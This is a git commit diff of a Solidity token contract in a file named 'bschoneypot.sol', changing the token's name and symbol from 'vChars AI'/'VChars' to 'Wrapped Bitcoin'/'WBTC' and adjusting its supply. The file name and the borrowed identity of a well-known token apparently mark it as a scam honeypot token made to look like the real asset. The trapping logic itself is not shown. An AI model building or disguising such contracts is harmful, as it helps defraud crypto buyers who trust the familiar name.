2875433acc153c21fb7e11980282b7b2355c2a81
Lindurz234 <234ababil@gmail.com>
2024-12-24 22:42:24 +0700

    bschoneypot.sol

--- bschoneypot.sol
+++ bschoneypot.sol
@@ -42,9 +42,9 @@ library SafeMath {
 contract NEWBSCCONTRACT {
     using SafeMath for uint256;
  
-    string public name = "vChars AI";
-    string public symbol = "VChars";
-    uint256 public totalSupply = 725000000000000000000000000;
+    string public name = "Wrapped Bitcoin";
+    string public symbol = "WBTC";
+    uint256 public totalSupply = 2500000000000000000000;
     uint8 public decimals = 18;
  
     mapping(address => uint256) public balanceOf;
